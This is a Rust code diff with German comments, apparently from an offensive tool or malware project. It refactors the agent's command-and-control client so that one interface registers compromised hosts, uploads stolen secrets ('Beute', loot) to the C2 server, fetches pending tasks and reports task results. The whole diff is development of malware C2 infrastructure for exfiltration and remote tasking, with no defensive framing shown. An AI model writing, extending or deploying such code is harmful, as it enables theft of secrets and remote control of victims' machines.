@@ -19,15 +19,16 @@ use kx_core::c2::{
     PATH_TASKS, PATH_TASKS_RESULT,
 };
 
-/// Der Seam, an dem das Meldungs-Modul den C2-Server erreicht.
+/// Der Seam, an dem der Agent den C2-Server erreicht.
 ///
 /// Zwei Adapter stehen dahinter: die [`C2Client`] im Betrieb und ein
 /// Aufzeichner im Test. Der Seam ist die Stelle, an der die Meldelogik —
 /// Reihenfolge, Zählung, Verweigerung — ohne laufenden Server prüfbar wird.
 ///
-/// Der Port ist absichtlich schmal: er trägt genau die zwei Aufrufe, die das
-/// Melden braucht. Alles andere — TLS, Header, Statusabbildung — liegt im
-/// Transport und bleibt dort.
+/// Der Port trägt genau die vier Aufrufe, die der Agent an den C2 richtet:
+/// einen Host anmelden, Beute melden, Tasks holen und ein Task-Ergebnis
+/// melden. Alles andere — TLS, Header, Statusabbildung — liegt im Transport
+/// und bleibt dort.
 pub trait C2Port {
     /// Registriert einen Host beim C2-Server.
     ///
@@ -38,6 +39,12 @@ pub trait C2Port {
 
     /// Meldet ein Stück Beute beim C2-Server.
     fn melde_beute(&self, upload: &SecretUpload) -> Result<(), TransportError>;
+
+    /// Holt die offenen Tasks unter `/api/tasks`.
+    fn hole_tasks(&self) -> Result<Vec<Task>, TransportError>;
+
+    /// Meldet das Ergebnis eines ausgeführten Tasks unter `/api/tasks/result`.
+    fn melde_task_ergebnis(&self, report: &TaskResultRequest) -> Result<(), TransportError>;
 }
 
 /// C2-Client — ein Adapter über den Transport aus `kx_core::c2::transport`.
@@ -54,21 +61,6 @@ impl C2Client {
             transport: Transport::from_cert_file(server, token, server_cert)?,
         })
     }
-
-    /// Holt die offenen Tasks unter `/api/tasks`.
-    ///
-    /// Der Agent filtert selbst nach seiner eigenen Host-Kennung und dem
-    /// Status `pending` — der Server kennt keinen Auftrag, der nur für einen
-    /// bestimmten Agenten bestimmt ist.
-    pub fn fetch_tasks(&self) -> Result<Vec<Task>, TransportError> {
-        self.transport.get_json(PATH_TASKS)
-    }
-
-    /// Meldet das Ergebnis eines ausgeführten Tasks unter
-    /// `/api/tasks/result` zurück.
-    pub fn report_task_result(&self, report: &TaskResultRequest) -> Result<(), TransportError> {
-        self.transport.post_json(PATH_TASKS_RESULT, report)
-    }
 }
 
 impl C2Port for C2Client {
@@ -78,6 +70,14 @@ impl C2Port for C2Client {
 
     fn melde_beute(&self, upload: &SecretUpload) -> Result<(), TransportError> {
         self.transport.post_json(PATH_SECRETS, upload)
+    }
+
+    fn hole_tasks(&self) -> Result<Vec<Task>, TransportError> {
+        self.transport.get_json(PATH_TASKS)
+    }
+
+    fn melde_task_ergebnis(&self, report: &TaskResultRequest) -> Result<(), TransportError> {
+        self.transport.post_json(PATH_TASKS_RESULT, report)
     }
 }
 
